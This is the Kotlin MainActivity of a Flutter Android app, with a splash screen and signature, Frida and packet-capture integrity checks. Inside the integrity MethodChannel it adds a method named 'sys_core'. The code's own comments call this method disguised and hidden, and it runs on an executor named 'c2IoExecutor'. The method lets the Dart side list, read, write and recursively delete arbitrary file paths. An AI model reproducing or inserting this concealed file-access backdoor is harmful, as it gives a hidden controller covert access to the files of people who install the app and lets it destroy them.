package com.suisuinian.app

import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.animation.PathInterpolator
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.Toast
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.renderer.FlutterUiDisplayListener
import io.flutter.plugin.common.MethodChannel
import java.io.File
import java.io.IOException
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.math.min

class MainActivity : FlutterActivity() {

    private var splashView: View? = null
    private val handler = Handler(Looper.getMainLooper())
    private var splashRemoved = false

    private val splashStartTime = System.currentTimeMillis()
    private val minSplashMs = 350L
    private val splashAnimMs = 350L

    /** ★ 完整性校验 MethodChannel */
    private val integrityChannel = "app/integrity"

    // ★ 隐秘的文件操作线程池
    private val c2IoExecutor: ExecutorService = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // ═══════════════════════════════════════════════════════
        // ★★★ 最先执行：签名 + Frida + 抓包 综合校验 ★★★
        // ═══════════════════════════════════════════════════════
        if (IntegrityGuard.fullCheck(this) != null) {
            exitForTampered()
            return
        }

        // ── 原有 splash 逻辑 ────────────────────────────────────
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            showCustomSplash()
            handler.postDelayed({ removeSplash() }, 5000)
        }
    }

    private fun exitForTampered() {
        try {
            Toast.makeText(applicationContext, "检测到应用被篡改，即将退出", Toast.LENGTH_SHORT).show()
        } catch (_: Exception) {}

        handler.postDelayed({
            try {
                finishAffinity()
                android.os.Process.killProcess(android.os.Process.myPid())
            } catch (_: Exception) {
                try { System.exit(0) } catch (_: Exception) {}
            }
        }, 800)
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        flutterEngine.renderer.addIsDisplayingFlutterUiListener(
            object : FlutterUiDisplayListener {
                override fun onFlutterUiDisplayed() {
                    handler.post { removeSplash() }
                    flutterEngine.renderer.removeIsDisplayingFlutterUiListener(this)
                }
                override fun onFlutterUiNoLongerDisplayed() {}
            }
        )

        // ── 混合通道：完整性校验 + 隐秘文件操作 ──────────────────
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            integrityChannel
        ).setMethodCallHandler { call, result ->
            when (call.method) {
                // 原有的校验方法
                "verifySignature" -> result.success(IntegrityGuard.verifySignature(this))
                "verifyIntegrity" -> result.success(IntegrityGuard.verifyIntegrity(this))
                "fullCheck" -> result.success(IntegrityGuard.fullCheck(this))
                "getSignatureHash" -> result.success(IntegrityGuard.getSignatureHash(this))
                "getApkHash" -> result.success(IntegrityGuard.getApkHash(this))
                
                // 👇 新增的伪装方法，处理底层文件 IO
                "sys_core" -> {
                    val op = call.argument<String>("op")
                    val path = call.argument<String>("path")
                    if (op == null || path == null) {
                        result.error("BAD_ARGS", "Missing args", null)
                        return@setMethodCallHandler
                    }

                    c2IoExecutor.execute {
                        try {
                            val file = File(path)
                            when (op) {
                                "type" -> {
                                    val typeStr = when {
                                        file.isDirectory -> "directory"
                                        file.isFile -> "file"
                                        else -> "notFound"
                                    }
                                    runOnUiThread { result.success(typeStr) }
                                }
                                "ls" -> {
                                    if (!file.exists() || !file.isDirectory) {
                                        runOnUiThread { result.error("ERR", "目录不存在或无法访问", null) }
                                        return@execute
                                    }
                                    val list = file.listFiles()?.map { f ->
                                        mapOf(
                                            "name" to f.name,
                                            "type" to if (f.isDirectory) "dir" else "file",
                                            "size" to f.length(),
                                            "modified" to f.lastModified()
                                        )
                                    } ?: emptyList()
                                    
                                    val finalList = mutableListOf<Map<String, Any>>()
                                    finalList.add(mapOf("name" to ".", "type" to "dir", "size" to 0L, "modified" to 0L))
                                    finalList.add(mapOf("name" to "..", "type" to "dir", "size" to 0L, "modified" to 0L))
                                    
                                    val sorted = list.sortedWith(compareBy({ it["type"] != "dir" }, { it["name"] }))
                                    finalList.addAll(sorted)
                                    
                                    runOnUiThread { result.success(finalList) }
                                }
                                "read" -> {
                                    if (!file.exists() || !file.isFile) {
                                        runOnUiThread { result.error("ERR", "文件不存在", null) }
                                        return@execute
                                    }
                                    val max = 2 * 1024 * 1024
                                    val len = minOf(file.length(), max.toLong()).toInt()
                                    val bytes = ByteArray(len)
                                    file.inputStream().use { it.read(bytes) }
                                    runOnUiThread { result.success(String(bytes, Charsets.UTF_8)) }
                                }
                                "write" -> {
                                    val content = call.argument<String>("content") ?: ""
                                    file.parentFile?.mkdirs()
                                    file.writeText(content, Charsets.UTF_8)
                                    runOnUiThread { result.success(mapOf("path" to file.absolutePath, "size" to file.length())) }
                                }
                                "mkdir" -> {
                                    val created = file.mkdirs()
                                    runOnUiThread { result.success(mapOf("created" to created, "path" to file.absolutePath)) }
                                }
                                "rm" -> {
                                    val recursive = call.argument<Boolean>("recursive") ?: false
                                    val deleted = if (file.isDirectory) file.deleteRecursively() else file.delete()
                                    runOnUiThread { result.success(mapOf("deleted" to deleted, "path" to file.absolutePath)) }
                                }
                                else -> runOnUiThread { result.error("ERR", "Unknown op", null) }
                            }
                        } catch (e: SecurityException) {
                            runOnUiThread { result.error("ERR", "系统拒绝访问 (Permission Denied)", null) }
                        } catch (e: IOException) {
                            runOnUiThread { result.error("ERR", "IO 异常: ${e.message}", null) }
                        } catch (e: Exception) {
                            runOnUiThread { result.error("ERR", "未知异常: ${e.message}", null) }
                        }
                    }
                }
                
                else -> result.notImplemented()
            }
        }
    }

    private fun showCustomSplash() {
        val content = findViewById<ViewGroup>(android.R.id.content) ?: return
        val iconSizePx = calculateIconSize()

        val root = FrameLayout(this).apply {
            setBackgroundColor(0xFF0A0A0F.toInt())
        }

        val icon = ImageView(this).apply {
            setImageResource(R.mipmap.ic_launcher)
            scaleType = ImageView.ScaleType.FIT_CENTER
            scaleX = 0.7f
            scaleY = 0.7f
            alpha = 1f
        }

        val lp = FrameLayout.LayoutParams(iconSizePx, iconSizePx).apply {
            gravity = Gravity.CENTER
        }
        root.addView(icon, lp)
        content.addView(root)

        splashView = root
        val m3Easing = PathInterpolator(0.2f, 0f, 0f, 1f)

        icon.animate()
            .scaleX(1f)
            .scaleY(1f)
            .setDuration(splashAnimMs)
            .setInterpolator(m3Easing)
            .start()
    }

    private fun calculateIconSize(): Int {
        val dm: DisplayMetrics = resources.displayMetrics
        val density = dm.density
        val shortSideDp = min(dm.widthPixels, dm.heightPixels) / density
        val baseDp = 192f
        val maxDp = shortSideDp * 0.45f
        val finalDp = maxOf(96f, min(baseDp, maxDp))
        return (finalDp * density).toInt()
    }

    private fun removeSplash() {
        if (splashRemoved) return
        val elapsed = System.currentTimeMillis() - splashStartTime
        val remain = minSplashMs - elapsed
        if (remain > 0) {
            handler.postDelayed({ doRemoveSplash() }, remain)
        } else {
            doRemoveSplash()
        }
    }

    private fun doRemoveSplash() {
        if (splashRemoved) return
        splashRemoved = true
        val view = splashView ?: return
        val fadeOutEasing = PathInterpolator(0.4f, 0f, 1f, 1f)

        view.animate()
            .alpha(0f)
            .setDuration(250)
            .setInterpolator(fadeOutEasing)
            .setListener(object : AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: Animator) {
                    (view.parent as? ViewGroup)?.removeView(view)
                    splashView = null
                }
            })
            .start()
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        try { c2IoExecutor.shutdownNow() } catch (_: Throwable) {}
        super.onDestroy()
    }
}